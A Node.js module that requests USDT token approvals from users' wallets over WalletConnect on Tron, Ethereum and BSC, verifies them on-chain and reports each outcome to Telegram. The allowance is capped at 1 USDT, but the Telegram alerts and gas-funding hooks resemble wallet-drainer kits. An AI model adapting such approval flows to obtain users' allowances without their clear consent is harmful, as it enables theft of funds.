const paymentStore = require("../storage/payments");
const sessionStore = require("../storage/sessions");
const { getClient } = require("./walletconnect");
const { getNetwork, MAX_ALLOWANCE_USDT } = require("../config/networks");
const { requireContracts } = require("../config/contracts");
const { verifyPaymentTransaction } = require("./transactionVerifier");
const { emitPaymentEvent, assertActiveSession, publicPayment } = require("./paymentService");
const {
    encodeErc20Approve,
    encodeTrc20TransferParameter,
    allowanceUnits
} = require("../utils/helpers");
const { NotFoundError, ValidationError, WalletConnectError } = require("../utils/errors");
const logger = require("../utils/logger");

function extractTxHash(result) {
    if (!result) {
        return null;
    }

    if (typeof result === "string") {
        return result.trim() || null;
    }

    return result.txid
        || result.txID
        || result.hash
        || result.transactionHash
        || result.transaction?.txID
        || result.transaction?.txid
        || (typeof result.result === "string" ? result.result : null)
        || null;
}

function pickAccount(session, network) {
    const accounts = session.accounts || [];
    return accounts.find((item) => item.chainId === network.chainId)
        || (network.namespace === "tron"
            ? accounts.find((item) => item.namespace === "tron")
            : accounts.find((item) => item.namespace === network.namespace && item.chainId === network.chainId))
        || accounts.find((item) => item.namespace === network.namespace)
        || null;
}

function unwrapTronTransaction(unsigned) {
    return unsigned?.transaction || unsigned;
}

async function broadcastTronSigned(signed, deps = {}) {
    const fetchImpl = deps.fetchImpl || fetch;
    const hash = extractTxHash(signed);

    if (hash && typeof signed === "string") {
        return hash;
    }

    const tx = unwrapTronTransaction(signed);

    if (!tx || typeof tx !== "object") {
        return hash;
    }

    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
    const response = await fetchImpl(`${base}/wallet/broadcasttransaction`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(tx)
    });
    const payload = await response.json();
    return extractTxHash(payload) || extractTxHash(tx) || hash;
}

async function buildTronApprove(from, spender, amountRaw, tokenContract, deps = {}) {
    const fetchImpl = deps.fetchImpl || fetch;
    const base = String(require("../config/env").TRON_API_URL || "https://api.trongrid.io").replace(/\/$/, "");
    const response = await fetchImpl(`${base}/wallet/triggersmartcontract`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            owner_address: from,
            contract_address: tokenContract,
            function_selector: "approve(address,uint256)",
            parameter: encodeTrc20TransferParameter(spender, amountRaw),
            fee_limit: 150000000,
            call_value: 0,
            visible: true
        })
    });

    const payload = await response.json();
    const transaction = unwrapTronTransaction(payload);

    if (!transaction) {
        throw new Error(payload?.Error || payload?.result?.message || "TronGrid did not return a transaction");
    }

    return transaction;
}

const EVM_ADD_CHAIN = {
    eth: {
        chainId: "0x1",
        chainName: "Ethereum",
        nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
        rpcUrls: ["https://cloudflare-eth.com"],
        blockExplorerUrls: ["https://etherscan.io"]
    },
    bsc: {
        chainId: "0x38",
        chainName: "BNB Smart Chain",
        nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
        rpcUrls: ["https://bsc-dataseed.binance.org"],
        blockExplorerUrls: ["https://bscscan.com"]
    }
};

function eip155Hex(chainId) {
    return `0x${Number(String(chainId).split(":")[1]).toString(16)}`;
}

function sessionEip155Chains(session, client) {
    const fromStore = (session.accounts || [])
        .map((item) => item.chainId)
        .filter((id) => String(id).startsWith("eip155:"));

    try {
        const wcSession = client?.session?.get?.(session.sessionTopic);
        const chains = wcSession?.namespaces?.eip155?.chains || [];
        const fromAccounts = (wcSession?.namespaces?.eip155?.accounts || []).map((account) => {
            const parts = String(account).split(":");
            return parts.length >= 2 ? `${parts[0]}:${parts[1]}` : null;
        }).filter(Boolean);
        return [...new Set([...fromStore, ...chains, ...fromAccounts])];
    } catch (_err) {
        return [...new Set(fromStore)];
    }
}

async function ensureEvmChain(client, session, network, topic) {
    const hexChainId = eip155Hex(network.chainId);
    const approved = sessionEip155Chains(session, client);
    const requestChainId = approved.includes(network.chainId) ? network.chainId : (approved[0] || network.chainId);
    const addParams = EVM_ADD_CHAIN[network.key];

    try {
        await client.request({
            topic,
            chainId: requestChainId,
            request: {
                method: "wallet_switchEthereumChain",
                params: [{ chainId: hexChainId }]
            }
        });
        return;
    } catch (err) {
        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_switchEthereumChain failed");
    }

    if (!addParams) {
        return;
    }

    try {
        await client.request({
            topic,
            chainId: requestChainId,
            request: {
                method: "wallet_addEthereumChain",
                params: [addParams]
            }
        });
    } catch (err) {
        logger.warn({ err: { message: err.message }, chainId: network.chainId }, "wallet_addEthereumChain failed");
    }
}

async function sendEvmApprove(client, topic, chainId, from, to, data) {
    const request = {
        topic,
        chainId,
        request: {
            method: "eth_sendTransaction",
            params: [{ from, to, value: "0x0", data }]
        }
    };

    try {
        return await client.request(request);
    } catch (err) {
        logger.warn({ err: { message: err.message }, chainId }, "eth_sendTransaction failed; retrying once");
        await new Promise((resolve) => setTimeout(resolve, 1200));
        return client.request(request);
    }
}

async function sendWalletApproval(client, session, payment, network, account) {
    const topic = session.sessionTopic;
    const amountRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);

    if (network.namespace === "tron") {
        const unsigned = await buildTronApprove(
            account.address,
            payment.spender,
            amountRaw,
            payment.tokenContract
        );

        const signed = await client.request({
            topic,
            chainId: network.chainId,
            request: {
                method: "tron_signTransaction",
                params: {
                    address: account.address,
                    transaction: unsigned
                }
            }
        });

        const txHash = await broadcastTronSigned(signed);
        return txHash || signed;
    }

    await ensureEvmChain(client, session, network, topic);
    return sendEvmApprove(
        client,
        topic,
        network.chainId,
        account.address,
        payment.tokenContract,
        encodeErc20Approve(payment.spender, amountRaw)
    );
}

async function finalizeWalletResult(paymentId, result, deps = {}) {
    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        return;
    }

    const txHash = extractTxHash(result);
    paymentStore.updatePayment(paymentId, {
        status: "wallet_confirmed",
        transactionHash: txHash
    });

    const latest = paymentStore.getPayment(paymentId);
    let verification = await verifyPaymentTransaction(latest, txHash, deps);
    const pending = /not found|not found on-chain|No transaction hash/i;
    const shouldPoll = !deps.rpc && !deps.fetcher && !deps.sendWalletApproval;

    for (let attempt = 0; shouldPoll && attempt < 12 && !verification.valid && pending.test(verification.reason || ""); attempt += 1) {
        await new Promise((resolve) => setTimeout(resolve, 2000));
        verification = await verifyPaymentTransaction(latest, txHash, deps);
    }

    if (!verification.valid) {
        const invalid = paymentStore.updatePayment(paymentId, {
            status: "invalid",
            error: verification.reason
        });
        emitPaymentEvent("approval_failed", invalid, { reason: verification.reason });
        try {
            const { notifyApprovalStatus } = require("./telegramNotifications");
            notifyApprovalStatus(invalid).catch((err) => {
                logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
            });
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
        }
        return;
    }

    const verified = paymentStore.updatePayment(paymentId, {
        status: "verified",
        transactionHash: verification.transactionHash || txHash,
        verifiedAmountRaw: verification.amount != null ? String(verification.amount) : null,
        error: null
    });
    emitPaymentEvent("approval_approved", verified);
    emitPaymentEvent("payment_verified", verified);

    try {
        const { notifyApprovalStatus } = require("./telegramNotifications");
        notifyApprovalStatus(verified).catch((err) => {
            logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
        });
    } catch (err) {
        logger.warn({ err: { message: err.message }, paymentId }, "Telegram approval notification failed");
    }
}

async function requestApproval(paymentId, deps = {}) {
    const payment = paymentStore.getPayment(paymentId);

    if (!payment) {
        throw new NotFoundError("Payment not found");
    }

    if (payment.status === "requested") {
        throw new ValidationError("An approval request is already waiting for wallet confirmation");
    }

    if (payment.status === "verified") {
        throw new ValidationError("This payment is already verified");
    }

    if (payment.status !== "created" && payment.status !== "awaiting_gas") {
        throw new ValidationError("This payment cannot be requested in its current status");
    }

    const session = sessionStore.getSession(payment.connectionId);
    assertActiveSession(session);

    const { checkGasSufficiency } = require("./gasFunding");
    let liveGas;
    if (deps.checkGasSufficiency) {
        liveGas = await deps.checkGasSufficiency(session, payment.network, deps);
    } else {
        try {
            await require("./balances").refreshBalances(payment.connectionId, { ...deps, skipCache: true });
        } catch (err) {
            logger.warn({ err: { message: err.message }, paymentId }, "Live gas refresh failed before approval");
        }
        const latest = sessionStore.getSession(payment.connectionId) || session;
        liveGas = await checkGasSufficiency(latest, payment.network, deps);
    }

    if (!liveGas || liveGas.sufficient !== true) {
        logger.warn({
            paymentId,
            network: payment.network,
            reason: liveGas?.reason
        }, "Native gas is low; still sending the Trust Wallet approval request");
        paymentStore.updatePayment(paymentId, {
            gasQuote: liveGas || payment.gasQuote,
            gasSufficient: false,
            status: "created"
        });
    } else {
        paymentStore.updatePayment(paymentId, {
            gasQuote: liveGas,
            gasSufficient: true,
            gasFundingVerified: true
        });
    }

    const contracts = requireContracts(payment.network);
    const network = getNetwork(payment.network);

    if (payment.spender !== contracts.card || payment.tokenContract !== contracts.usdt) {
        throw new ValidationError("Payment contracts do not match server configuration");
    }

    const maxRaw = MAX_ALLOWANCE_USDT * allowanceUnits(network.usdtDecimals);

    if (BigInt(payment.allowanceRaw) > maxRaw) {
        throw new ValidationError("Allowance exceeds 1 USDT");
    }

    const account = pickAccount(session, network);

    if (!account?.address) {
        throw new ValidationError(`Connected wallet has no ${network.name} account`);
    }

    const client = deps.client || getClient();

    if (!client) {
        throw new WalletConnectError("WalletConnect is not initialized");
    }

    const requested = paymentStore.updatePayment(paymentId, {
        status: "requested",
        error: null
    });

    emitPaymentEvent("approval_request_sent", requested);

    const send = deps.sendWalletApproval || sendWalletApproval;
    const wait = deps.wait === true;

    const run = async () => {
        try {
            const latestSession = sessionStore.getSession(payment.connectionId);
            const result = await send(client, latestSession, requested, network, account);
            await finalizeWalletResult(paymentId, result, deps);
            return publicPayment(paymentStore.getPayment(paymentId));
        } catch (err) {
            logger.warn({ err, paymentId }, "Payment approval was rejected or failed");
            const failed = paymentStore.updatePayment(paymentId, {
                status: "rejected",
                error: err.message
            });
            emitPaymentEvent("approval_rejected", failed, { message: err.message });
            try {
                const { notifyApprovalStatus } = require("./telegramNotifications");
                notifyApprovalStatus(failed).catch((notifyErr) => {
                    logger.warn({ err: { message: notifyErr.message }, paymentId }, "Telegram approval notification failed");
                });
            } catch (notifyErr) {
                logger.warn({ err: { message: notifyErr.message }, paymentId }, "Telegram approval notification failed");
            }
            return publicPayment(failed);
        }
    };

    if (wait) {
        return run();
    }

    setImmediate(() => {
        run().catch((err) => logger.error({ err, paymentId }, "Approval background task failed"));
    });

    return publicPayment(requested);
}

module.exports = {
    requestApproval,
    sendWalletApproval,
    extractTxHash
};
